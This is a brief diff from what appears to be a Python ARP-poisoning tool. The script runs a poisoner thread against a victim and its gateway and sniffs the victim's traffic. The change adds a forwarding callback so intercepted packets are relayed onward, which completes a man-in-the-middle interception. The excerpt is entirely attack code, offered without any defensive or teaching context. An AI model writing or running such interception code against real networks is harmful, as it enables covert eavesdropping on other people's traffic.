@@ -55,7 +55,7 @@ string_of_poison = Thread(target=arpPoison.poisoner, args=(gateway_IP=p.gatewayI
 if p.verbose:
     print("Attack start")
 string_of_poison.start()
-packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, timeout=p.duration + 1)
+packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, timeout=p.duration + 1, prn=arpPoison.forward)
 
 string_of_poison.join()
 
